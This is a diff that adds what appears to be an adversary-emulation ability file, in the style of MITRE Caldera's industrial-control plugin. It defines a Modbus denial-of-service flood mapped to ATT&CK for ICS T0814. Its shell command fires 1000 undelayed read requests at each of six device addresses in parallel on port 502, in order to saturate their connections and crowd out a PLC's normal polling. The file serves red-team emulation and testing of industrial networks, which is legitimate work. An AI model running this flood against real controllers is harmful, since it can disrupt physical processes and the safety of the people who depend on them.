@@ -1,0 +1,30 @@
+---
+
+- id: f6a7b8c9-6666-6666-6666-000000000004
+  name: Modbus - Denial of Service Flood
+  description: |
+    Flood all Modbus servers with rapid read requests to saturate
+    the TCP connection pool. Each device gets 1000 read requests
+    with no delay, competing with the PLC's legitimate 100ms polling.
+  tactic: inhibit-response-function
+  technique_id: T0814
+  technique_name: Denial of Service
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      flood_device() {
+        for i in $(seq 1 1000); do
+          ./modbus_cli $1 --port 502 read_ir 1 2 2>/dev/null;
+        done
+      };
+      flood_device 192.168.95.10 &
+      flood_device 192.168.95.11 &
+      flood_device 192.168.95.12 &
+      flood_device 192.168.95.13 &
+      flood_device 192.168.95.14 &
+      flood_device 192.168.95.15 &
+      wait;
+      echo "DOS_FLOOD_COMPLETE"
+    payloads:
+    - modbus_cli
